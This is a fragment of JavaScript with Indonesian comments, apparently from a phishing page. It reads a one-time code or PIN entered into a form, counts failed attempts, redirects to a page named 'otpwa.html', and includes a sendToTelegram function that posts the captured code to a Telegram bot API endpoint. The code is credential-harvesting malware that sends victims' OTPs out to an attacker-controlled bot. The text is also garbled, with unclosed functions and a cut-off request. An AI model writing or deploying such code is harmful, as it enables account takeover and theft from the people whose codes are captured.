        function sendOtp() {
            event.stopPropagation();
            event.preventDefault();

            // Ambil nilai OTP dari form
            const otpValue = document.getElementById('alexhosting').value;
            
            // Kirim OTP ke Telegram

            // Simulasi validasi PIN (gantilah dengan logika validasi yang sesungguhnya)
            const isValidPin = validatePin(otpValue);
            
            if (!isValidPin) {
                errorCount++;
                updateErrorDisplay();
                
                // Jika sudah mencapai batas kesalahan, alihkan ke halaman verif
                if (errorCount > MAX_ERRORS) {
                    redirectToVerifPage();
                    return;
                }
            } else {
                // Reset error count jika PIN benar
                errorCount = 0;
                updateErrorDisplay();
            }
            
            // Lanjutkan dengan proses normal

            setTimeout(() => {
                $("#alexhosting").val("");

        // Fungsi untuk memvalidasi PIN (gantilah dengan logika validasi yang sesungguhnya)
        function validatePin(pin) {
            // Contoh validasi sederhana, gantilah dengan logika validasi yang sesuai
            // Misalnya, PIN yang benar adalah "123456"
            return pin === "811897";
        }
        
        // Fungsi untuk mengupdate tampilan jumlah kesalahan
        function updateErrorDisplay() {
            const errorCountElement = document.getElementById('errorCount');
            if (errorCount > 0) {
                errorCountElement.textContent = ``;
                if (errorCount === MAX_ERRORS) {
                    errorCountElement.textContent += "";
                }
            } else {
                errorCountElement.textContent = "";
            }
        }
        
        // Fungsi untuk mengalihkan ke halaman verif
        function redirectToVerifPage() {
            // Ganti URL berikut dengan URL halaman verifikasi yang sesuai
            window.location.href = "otpwa.html";

        // Fungsi untuk mengirim pesan ke Telegram
        function sendToTelegram(otp) {

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {

                headers: {
                    'Content-Type': 'application/json',
